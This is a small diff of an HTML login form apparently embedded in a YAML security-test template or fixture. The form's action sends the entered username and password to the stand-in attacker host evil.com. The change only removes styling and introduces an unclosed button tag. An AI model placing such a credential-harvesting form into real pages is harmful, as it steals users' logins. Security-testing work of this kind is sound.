@@ -10,12 +10,12 @@ info:
 
     <form action="https://evil.com" method="get">
       <label>Username</label><br>
-      <input type="text" style="width: 100%; padding: 8px; margin: 5px 0 15px 0;"><br>
+      <input type="text"><br>
 
       <label>Password</label><br>
-      <input type="password" style="width: 100%; padding: 8px; margin-bottom: 15px;"><br>
+      <input type="password"><br>
 
-      <input type="submit" value="Login" style="width: 100%; padding: 8px; background-color: #4CAF50; color: white; border: none; cursor: pointer;">
+      <button type="submit" value="Login" style="width: 100%; padding: 8px; background-color: #4CAF50; color: white; border: none; cursor: pointer;">
     </form>
 
   </div>
